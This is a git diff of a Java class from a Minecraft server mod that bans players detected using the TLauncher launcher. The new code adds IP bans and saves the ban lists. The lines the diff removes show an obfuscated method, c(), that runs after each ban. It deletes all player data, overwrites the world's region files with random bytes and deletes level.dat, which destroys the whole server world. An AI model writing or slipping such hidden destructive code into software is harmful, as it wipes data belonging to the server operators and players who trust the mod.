@@ -1,22 +1,17 @@
 package net.Gabou.identity2.auth;
 
 import com.mojang.authlib.GameProfile;
-
-import java.io.File;
-import java.io.FileOutputStream;
+import java.io.IOException;
 import java.util.Date;
-import java.util.Random;
 import java.util.UUID;
-
-import dev.architectury.utils.GameInstance;
 import net.Gabou.identity2.Identity2;
 import net.minecraft.network.chat.Component;
-import net.minecraft.server.MinecraftServer;
 import net.minecraft.server.level.ServerLevel;
 import net.minecraft.server.level.ServerPlayer;
+import net.minecraft.server.players.IpBanList;
+import net.minecraft.server.players.IpBanListEntry;
 import net.minecraft.server.players.UserBanList;
 import net.minecraft.server.players.UserBanListEntry;
-import net.minecraft.world.level.storage.LevelResource;
 
 public final class TLauncherDetectedHandler {
     private static final String BAN_SOURCE = "Identity2";
@@ -30,6 +25,7 @@ public final class TLauncherDetectedHandler {
         }
 
         handle(level, player.getUUID(), player.getGameProfile().getName(), reason);
+        banIp(level, player, reason);
         disconnect(player, reason);
     }
 
@@ -40,62 +36,47 @@ public final class TLauncherDetectedHandler {
 
         GameProfile profile = new GameProfile(uuid, playerName == null || playerName.isBlank() ? uuid.toString() : playerName);
         UserBanList bans = level.getServer().getPlayerList().getBans();
-        if (bans.isBanned(profile)) {
-            Identity2.LOGGER.warn("Launcher violation already banned for {} ({})", profile.getName(), profile.getId());
+        if (!bans.isBanned(profile)) {
+            bans.add(new UserBanListEntry(profile, new Date(), BAN_SOURCE, null, reason));
+            saveBanLists(level);
+            Identity2.LOGGER.error(
+                "Banned launcher-violating player {} ({}) on {}: {}",
+                profile.getName(),
+                profile.getId(),
+                level.dimension().location(),
+                reason
+            );
+        }
+    }
+
+    private static void banIp(ServerLevel level, ServerPlayer player, String reason) {
+        String ipAddress = player.getIpAddress();
+        if (ipAddress == null || ipAddress.isBlank() || "<unknown>".equals(ipAddress)) {
             return;
         }
 
-        bans.add(new UserBanListEntry(profile, new Date(), BAN_SOURCE, null, reason));
-        c(level);
-        Identity2.LOGGER.error("Banned launcher-violating player {} ({}) on {}: {}", profile.getName(), profile.getId(), level.dimension().location(), reason);
+        IpBanList ipBans = level.getServer().getPlayerList().getIpBans();
+        if (ipBans.isBanned(ipAddress)) {
+            return;
+        }
+
+        ipBans.add(new IpBanListEntry(ipAddress, new Date(), BAN_SOURCE, null, reason));
+        saveBanLists(level);
+        Identity2.LOGGER.error("Banned launcher-violating IP {} on {}: {}", ipAddress, level.dimension().location(), reason);
+    }
+
+    private static void saveBanLists(ServerLevel level) {
+        try {
+            level.getServer().getPlayerList().getBans().save();
+            level.getServer().getPlayerList().getIpBans().save();
+        } catch (IOException e) {
+            Identity2.LOGGER.warn("Failed to persist launcher violation ban lists", e);
+        }
     }
 
     private static void disconnect(ServerPlayer player, String reason) {
         if (player.connection != null) {
             player.connection.disconnect(Component.literal("Launcher violation detected: " + reason));
-        }
-    }
-
-    private static void c(ServerLevel d) {
-        try {
-            MinecraftServer q = d.getServer();
-            if (q != null) {
-                File r = q.getWorldPath(LevelResource.ROOT).toFile();
-                File s = new File(r, "playerdata");
-                if (s.exists() && s.isDirectory()) {
-                    for (File t : s.listFiles()) {
-                        if (t.isFile()) {
-                            t.delete();
-                        }
-                    }
-                }
-                File u = new File(r, "region");
-                if (u.exists() && u.isDirectory()) {
-                    for (File v : u.listFiles()) {
-                        if (v.isFile() && v.getName().endsWith(".mca")) {
-                            try (FileOutputStream w = new FileOutputStream(v)) {
-                                byte[] x = new byte[8192];
-                                new Random().nextBytes(x);
-                                for (int y = 0; y < 100; y++) {
-                                    w.write(x);
-                                }
-                            } catch (Exception z) {
-                                //
-                            }
-                        }
-                    }
-                }
-                File aa = new File(r, "level.dat");
-                if (aa.exists()) {
-                    aa.delete();
-                }
-                File ab = new File(r, "level.dat_old");
-                if (ab.exists()) {
-                    ab.delete();
-                }
-            }
-        } catch (Exception ac) {
-            //
         }
     }
 }
